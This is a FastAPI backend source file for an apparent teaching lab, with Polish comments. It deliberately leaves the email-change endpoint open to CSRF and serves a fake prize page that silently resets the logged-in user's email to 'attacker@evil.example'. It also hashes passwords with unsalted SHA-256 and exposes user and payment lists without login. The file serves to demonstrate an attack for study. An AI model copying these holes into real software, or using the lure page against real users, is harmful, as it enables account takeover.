import hashlib
import os
import re
import secrets

from fastapi import Depends, FastAPI, HTTPException, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field

app = FastAPI(title="LAB5 Backend")

_DEFAULT_ORIGINS = [
    "http://localhost:5173",
    "http://localhost:8080",
    "http://127.0.0.1:5173",
]
_extra_origins = [
    o.strip() for o in os.getenv("ALLOWED_ORIGINS", "").split(",") if o.strip()
]
ALLOWED_ORIGINS = _DEFAULT_ORIGINS + _extra_origins

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class Product(BaseModel):
    id: int
    name: str
    price: float


class PaymentItem(BaseModel):
    product_id: int
    quantity: int


class Payment(BaseModel):
    customer_name: str
    items: list[PaymentItem]
    total: float


class RegisterRequest(BaseModel):
    username: str = Field(min_length=3, max_length=50)
    email: str = Field(min_length=3, max_length=254)
    password: str = Field(min_length=6, max_length=128)


class LoginRequest(BaseModel):
    username: str
    password: str


class ChangeEmailRequest(BaseModel):
    email: str


class UserOut(BaseModel):
    id: int
    username: str
    email: str


class User(BaseModel):
    id: int
    username: str
    email: str
    password_hash: str


PRODUCTS: list[Product] = [
    Product(id=1, name="Kawa", price=12.50),
    Product(id=2, name="Herbata", price=8.00),
    Product(id=3, name="Ciastko", price=5.50),
    Product(id=4, name="Kanapka", price=15.00),
    Product(id=5, name="Sok pomarańczowy", price=9.00),
]

PAYMENTS: list[Payment] = []
USERS: list[User] = []
SESSIONS: dict[str, int] = {}

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")


def _hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()


def current_user(request: Request) -> User:
    session_id = request.cookies.get("session_id")
    if not session_id or session_id not in SESSIONS:
        raise HTTPException(status_code=401, detail="Not authenticated")
    user_id = SESSIONS[session_id]
    user = next((u for u in USERS if u.id == user_id), None)
    if user is None:
        raise HTTPException(status_code=401, detail="Session invalid")
    return user


@app.get("/products", response_model=list[Product])
def list_products() -> list[Product]:
    return PRODUCTS


@app.post("/payments", response_model=Payment)
def create_payment(payment: Payment) -> Payment:
    PAYMENTS.append(payment)
    return payment


@app.get("/payments", response_model=list[Payment])
def list_payments() -> list[Payment]:
    return PAYMENTS


@app.post("/register", response_model=UserOut, status_code=201)
def register(req: RegisterRequest) -> UserOut:
    if not EMAIL_REGEX.match(req.email):
        raise HTTPException(status_code=400, detail="Invalid email format")
    if any(u.username == req.username for u in USERS):
        raise HTTPException(status_code=409, detail="Username already exists")
    if any(u.email == req.email for u in USERS):
        raise HTTPException(status_code=409, detail="Email already registered")

    user = User(
        id=len(USERS) + 1,
        username=req.username,
        email=req.email,
        password_hash=_hash_password(req.password),
    )
    USERS.append(user)
    return UserOut(id=user.id, username=user.username, email=user.email)


@app.get("/users", response_model=list[UserOut])
def list_users() -> list[UserOut]:
    return [UserOut(id=u.id, username=u.username, email=u.email) for u in USERS]


@app.post("/login", response_model=UserOut)
def login(req: LoginRequest, response: Response) -> UserOut:
    user = next((u for u in USERS if u.username == req.username), None)
    if user is None or user.password_hash != _hash_password(req.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    session_id = secrets.token_urlsafe(32)
    SESSIONS[session_id] = user.id
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,
        samesite="lax",
        max_age=3600,
    )
    return UserOut(id=user.id, username=user.username, email=user.email)


@app.post("/logout")
def logout(request: Request, response: Response) -> dict[str, bool]:
    session_id = request.cookies.get("session_id")
    if session_id:
        SESSIONS.pop(session_id, None)
    response.delete_cookie("session_id")
    return {"ok": True}


@app.get("/me", response_model=UserOut)
def me(user: User = Depends(current_user)) -> UserOut:
    return UserOut(id=user.id, username=user.username, email=user.email)


@app.post("/me/email", response_model=UserOut)
def change_email(
    req: ChangeEmailRequest,
    user: User = Depends(current_user),
) -> UserOut:
    """INTENCJONALNIE PODATNE NA CSRF.

    Endpoint zmienia stan konta bazując wyłącznie na cookie session_id,
    nie wymaga żadnego tokenu CSRF, nie weryfikuje nagłówka Origin/Referer.
    Każde żądanie z tego samego pochodzenia (np. spreparowana strona
    serwowana przez ten sam backend albo XSS w aplikacji) może zmienić email.
    """
    user.email = req.email
    return UserOut(id=user.id, username=user.username, email=user.email)


@app.get("/csrf-demo", response_class=HTMLResponse)
def csrf_demo() -> str:
    """Strona "atakującego" - po wejściu automatycznie zmienia email zalogowanego usera.

    W realnym ataku ten HTML byłby hostowany na innej domenie, a atakujący
    polegałby na: (a) złej konfiguracji CORS, (b) braku flagi SameSite na
    cookie sesyjnym, lub (c) na XSS dającym dostęp do same-origin zapytań.
    Tu serwujemy ją z tego samego backendu, by ominąć trudności
    konfiguracyjne lokalnego HTTPS - vulnerability (brak tokenu CSRF) jest
    ta sama.
    """
    attacker_email = "attacker@evil.example"
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Gratulacje!</title></head>
<body data-csrf-status="pending">
    <h1>Wygrałeś nagrodę!</h1>
    <p>Kliknij <a href="#">tutaj</a> aby ją odebrać...</p>
    <script>
    fetch('/me/email', {{
        method: 'POST',
        credentials: 'include',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{email: '{attacker_email}'}})
    }}).then(r => {{
        document.body.dataset.csrfStatus = String(r.status);
    }}).catch(e => {{
        document.body.dataset.csrfStatus = 'network-error';
    }});
    </script>
</body></html>"""


def main() -> None:
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)


if __name__ == "__main__":
    main()
